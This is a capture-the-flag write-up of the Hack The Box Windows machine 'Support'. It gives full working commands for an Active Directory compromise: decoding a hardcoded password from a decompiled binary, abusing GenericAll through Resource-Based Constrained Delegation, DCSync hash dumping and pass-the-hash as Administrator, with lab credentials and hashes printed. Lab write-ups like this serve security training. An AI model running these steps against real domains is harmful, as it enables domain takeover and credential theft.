# HTB: Support

<img src="../assets/icons/support.png" width="100">

**Difficulty:** Easy
**OS:** Windows

## Overview

Support is a Windows Active Directory box that starts with an SMB null session, leads to credential recovery from a custom staff tool, and ends with an ACL misconfiguration abuse (GenericAll over the domain controller's computer object) to achieve full domain compromise via Resource-Based Constrained Delegation (RBCD).

---

## Enumeration

### Nmap

```
nmap -Pn -sC -sV -oN support.nmap [TARGET_IP]
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Classic domain controller fingerprint: full Kerberos/LDAP/SMB/RPC stack, hostname `DC`, domain `support.htb`. WinRM open on 5985 signals a likely path to a shell once valid credentials are found.

Added to `/etc/hosts`:
```
[TARGET_IP]  support.htb DC.support.htb DC
```

### SMB Null Session

```
netexec smb [TARGET_IP] -u '' -p ''
```

Null authentication was allowed. Share listing via netexec was denied, but `smbclient` succeeded:

```
smbclient -N -L //[TARGET_IP]/
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

The `support-tools` share stood out as non-default.

---

## Foothold

### Recovering Credentials from a Custom Binary

Downloaded the contents of `support-tools`:

```
smbclient -N //[TARGET_IP]/support-tools
prompt off
recurse on
mget *
```

Most files were standard portable utilities (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark). One stood out: `UserInfo.exe.zip` — a custom internal tool rather than a known third-party utility.

Decompiled with `ilspycmd` (.NET assembly):

```
dotnet tool install -g ilspycmd
ilspycmd UserInfo.exe -o decompiled/
```

The decompiled source revealed an LDAP bind routine using a hardcoded, XOR-obfuscated password:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
// decryption: array[i] ^ key[i % key.Length] ^ 0xDF

entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

Decoded with a short Python script:

```python
import base64
enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'
data = base64.b64decode(enc)
result = bytes([data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data))])
print(result)
```

**Recovered credential:** `support\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Validated:
```
netexec smb [TARGET_IP] -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

### Domain Enumeration as `ldap`

RID brute force enumerated the full user list (21 users), including a `support` account and a `Shared Support Accounts` group.

```
netexec smb [TARGET_IP] -u 'ldap' -p '<password>' --rid-brute
```

Ran BloodHound collection for offline ACL analysis:

```
bloodhound-python -u 'ldap' -p '<password>' -d support.htb -ns [TARGET_IP] -c all
```

Without the BloodHound GUI available, the raw JSON output was queried directly with `jq`:

```
cat *_computers.json | jq -r '.data[] | .Aces[] | select(.RightName != "Owns") | "\(.RightName)\t\(.PrincipalSID)"' | sort -u
```

This revealed **`GenericAll` on the DC's computer object granted to SID `...-1103`**, which corresponds to the `Shared Support Accounts` group. That group's sole member is SID `...-1105` — the `support` user.

### Recovering the `support` Password

Queried the `support` user's LDAP attributes directly:

```
ldapsearch -x -H ldap://[TARGET_IP] -D "support\ldap" -w '<password>' -b "dc=support,dc=htb" "(sAMAccountName=support)"
```

The `info` attribute contained a plaintext password:

```
info: Ironside47pleasure40Watchful
```

`support` is also a member of `Remote Management Users`, granting WinRM access.

### Shell as `support`

```
evil-winrm -i [TARGET_IP] -u 'support' -p 'Ironside47pleasure40Watchful'
```

**User flag:** `[REDACTED]`

---

## Privilege Escalation

BloodHound analysis confirmed `support` (via `Shared Support Accounts`) holds `GenericAll` over the `DC$` computer object — full control of the domain controller's AD object.

### Attempt 1: Shadow Credentials (dead end)

Added a shadow credential to `DC$` using `pywhisker`:

```
pywhisker -d "support.htb" -u "support" -p "Ironside47pleasure40Watchful" --target "DC$" --action "add"
```

This succeeded and produced a `.pfx` certificate. However, requesting a TGT via PKINIT failed on this domain:

```
KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)
```

This domain has no ADCS (Certificate Authority) deployed, so the DC cannot process PKINIT pre-authentication. Shadow Credentials was not viable here — pivoted to RBCD instead.

### Attempt 2: Resource-Based Constrained Delegation (successful)

**1. Added a fake computer account** (default domain policy allows authenticated users to add computer objects):

```
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip [TARGET_IP] 'support.htb/support:Ironside47pleasure40Watchful'
```

**2. Configured RBCD** on the DC's computer object using the `support` account's `GenericAll` right, via `bloodyAD`:

```
bloodyAD --host [TARGET_IP] -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd DC$ FAKE01$
```

This grants `FAKE01$` the ability to impersonate arbitrary users against `DC$` via S4U2Proxy.

**3. Requested a service ticket impersonating Administrator:**

```
getST.py -spn 'HOST/DC.support.htb' -impersonate Administrator -dc-ip [TARGET_IP] 'support.htb/FAKE01$:FakePass123!'
```

**4. Used the resulting ticket to DCSync the full domain:**

```
export KRB5CCNAME=Administrator@HOST_DC.support.htb@SUPPORT.HTB.ccache
secretsdump.py -k -no-pass -dc-ip [TARGET_IP] 'support.htb/administrator@DC.support.htb'
```

This dumped every domain account's NTLM and Kerberos secrets, including:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

### Shell as Administrator

```
evil-winrm -i [TARGET_IP] -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
```

**Root flag:** `[REDACTED]`

---

## Additional Finding

Every standard domain user (`smith.rosario`, `hernandez.stanley`, `wilson.shelby`, etc.) shares an identical NTLM hash (`0fab66daddc6ba42a3b0963123350706`), indicating a shared/default password was set across multiple accounts. This wasn't required for the attack path taken, but represents a secondary organizational weakness worth noting.

---

## Summary of Attack Chain

1. SMB null session → discovered `support-tools` share
2. Downloaded and decompiled `UserInfo.exe` → recovered XOR-encrypted LDAP credential
3. Authenticated as `support\ldap` → RID brute forced user list
4. BloodHound (manual JSON/jq analysis) → identified `GenericAll` on `DC$` held by `Shared Support Accounts` group
5. LDAP query of `support` user's `info` attribute → recovered plaintext password
6. WinRM access as `support` (Remote Management Users member) → user flag
7. GenericAll on `DC$` → Shadow Credentials attempt failed (no ADCS in domain)
8. Pivoted to RBCD: added fake computer account, configured delegation, requested impersonated service ticket
9. DCSync via DRSUAPI → full domain hash dump → Administrator access → root flag

## Key Techniques

- SMB/LDAP null session enumeration
- .NET binary reverse engineering (custom XOR obfuscation)
- RID cycling for domain user enumeration
- Manual BloodHound JSON analysis without the GUI (`jq`)
- LDAP attribute abuse (plaintext credentials in `info` field)
- ACL abuse: `GenericAll` over a computer object
- Resource-Based Constrained Delegation (RBCD) attack
- DCSync via DRSUAPI (`secretsdump.py`)